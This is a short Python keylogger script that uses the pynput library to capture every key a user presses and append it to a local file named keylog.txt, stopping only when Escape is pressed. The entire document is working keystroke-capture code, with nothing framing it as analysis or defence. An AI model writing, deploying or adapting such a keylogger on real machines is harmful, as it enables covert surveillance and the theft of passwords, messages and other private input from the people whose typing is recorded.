import pynput # type: ignore
from pynput import keyboard # type: ignore

# File to log keystrokes
log_file = "keylog.txt"

# Define what to do when a key is pressed
def on_press(key):
    try:
        # Log the key to the file
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (like shift, ctrl, etc.) will raise an AttributeError
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Define what to do when a key is released
def on_release(key):
    # Stop listener when escape key is pressed
    if key == keyboard.Key.esc:
        return False

# Start the keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()